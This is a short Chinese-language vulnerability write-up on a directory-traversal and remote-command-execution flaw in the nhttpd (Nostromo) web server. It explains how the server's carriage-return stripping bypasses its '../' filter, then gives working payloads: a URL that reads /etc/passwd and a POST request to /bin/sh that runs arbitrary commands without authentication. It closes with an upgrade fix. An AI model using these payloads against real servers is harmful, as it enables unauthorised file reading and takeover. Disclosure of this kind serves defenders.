### 一 漏洞描述
nhttpd 是一个简单、快速和安全的 HTTP 服务器。它作为单个进程运行，使用 select(2) 处理连接。对于 CGI 和目录列表，它执行 fork(2)。nhttpd 实现了最小的 HTTP/1.1 和 CGI​​/1.1。还支持的是；chroot、setuid、基本身份验证、SSL、IPv6、自定义响应、别名和虚拟主机。要停止服务器，请向 PID 发送 SIGTERM 信号。访问日志以标准 CLF 格式编写。
在手册页中阅读更多内容。

注意： 已在 OpenBSD、FreeBSD、NetBSD 和 Linux 上成功完成编译和测试。

没有通过身份验证的攻击者可以强制服务器指向/bin/sh之类的shell文件并执行任意命令。

原理:  
通过’\n’或’\r\n’切分传入的header字符串，当for循环中原始header中出现’\n’，则认为是一行数据的截至，停止对dst变量进行赋值，此时dst变量中存放的为这一行完整的数据。  
但是在windows中，会使用\r\n进行换行。  
为了不把”\r”混入新的一行中，即避免存在”line1\r”情况的出现，程序通过判断原始header中逐位的字符是否是”\r”，若该处字符是”\r”，则continue，不将该字符”\r”赋值给最终的dst变量。  

导致`.\r./.\r./`经过过滤后变为`../../`，绕过了原本的拦截。


### 二 漏洞利用
文件读取  
`/..%0D/..%0D/..%0D/..%0D/..%0D/..%0D/etc/passwd`  
命令执行  
`POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1`

### 三 漏洞修复
升级版本 > 1.9.6

> 参考链接
> http://www.nazgul.ch/dev_nostromo.html  
> 分析: https://xz.aliyun.com/t/6745  
> https://blog.csdn.net/NOSEC2019/article/details/102687878
